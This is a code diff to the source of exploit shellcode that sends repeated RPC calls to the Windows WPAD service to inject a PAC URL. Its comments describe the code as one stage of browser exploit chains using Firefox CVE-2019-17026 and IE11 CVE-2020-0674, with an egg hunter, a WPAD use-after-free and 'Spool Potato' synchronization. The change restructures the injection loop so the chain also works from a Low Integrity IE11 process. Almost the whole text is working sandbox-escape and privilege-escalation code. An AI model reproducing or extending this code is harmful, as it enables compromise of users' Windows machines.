@@ -61,10 +61,11 @@ When executed via Firefox CVE-2019-17026, this is the second shellcode to be run
 as part of this chain and will be found on the heap by the JIT sprayed egg hunter
 shellcode, set to +RWX and then executed via a CALL instruction.
 
-It will not work properly in IE11 64-bit (Enhanced Protected Mode) on Windows 8.1
-due to the Low Integrity status of iexplore.exe being unable to create the global
-synchronization event object in \BaseNamedObjects. If the synchronization
-requirement is removed, it will work fine.
+When executed via Internet Explorer 11 Enhanced Protected Mode CVE-2020-0674 this
+will be the first stage/initial shellcode to be executed, and will result in 
+repeated continuous RPC calls to WPAD resulting in multiple payload execution.
+This is due to IE11 running as Low Integrity being unable to create the global
+event object needed to synchronize this shellcode with the Spool Potato shellcode.
 
 It should also be noted that this code is designed to be run on Windows 8.1 or 10:
 the WPAD RPC interface has changed between Windows 7 and 8.1 and the interface
@@ -315,7 +316,7 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 }
 
 void WpadSpoolSync(const wchar_t* PacUrl) {
-    HANDLE hEvent;
+    HANDLE hEvent = NULL;
 
     /*
     SpoolPotato/WPAD client synchronization
@@ -344,20 +345,6 @@ void WpadSpoolSync(const wchar_t* PacUrl) {
     if ((hEvent = CreateEventW(NULL, TRUE, FALSE, SYNC_EVENT_NAME)) != NULL) { // Creating event globally bypasses FF sandbox but will not work with IE11 64-bit (Protected Mode) running as Low Integrity. Event will be created to \BaseNamedObjects rather than current session namespace.
         if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
             DebugLog(L"... successfully set Everyone ACL on event object");
-
-            while (TRUE) {
-                DebugLog(L"... sending PAC update RPC signal to WPAD for %ws...", PacUrl);
-                RPC_STATUS RpcStatus = WpadInjectPac(PacUrl);
-                DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x. Waiting on event signal...", RpcStatus);
-
-                if (WaitForSingleObject(hEvent, 500) == WAIT_OBJECT_0) {
-                    DebugLog(L"... received sync signal from code within WPAD");
-                    break;
-                }
-                else {
-                    DebugLog(L"... timed out waiting on sync signal from code within WPAD");
-                }
-            }
         }
         else {
             CloseHandle(hEvent);
@@ -366,6 +353,26 @@ void WpadSpoolSync(const wchar_t* PacUrl) {
     }
     else {
         DebugLog(L"... failed to create sync event");
+    }
+
+    while (TRUE) {
+        DebugLog(L"... sending PAC update RPC signal to WPAD for %ws...", PacUrl);
+        RPC_STATUS RpcStatus = WpadInjectPac(PacUrl);
+        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x. Waiting on event signal...", RpcStatus);
+
+        if (hEvent != NULL) {
+            if (WaitForSingleObject(hEvent, 250) == WAIT_OBJECT_0) { // Note that when the RPC call is successful it will hang waiting on the async call event, thus I don't need to be concerned about this loop sending multiple PAC to WPAD and messing up the UAF or launching multiple payloads
+                DebugLog(L"... received sync signal from code within WPAD");
+                break;
+            }
+            else {
+                DebugLog(L"... timed out waiting on sync signal from code within WPAD");
+            }
+        }
+        else {
+            DebugLog(L"... sleeping due to event creation failure (infinite RPC loop)");
+            Sleep(250);
+        }
     }
 }
 
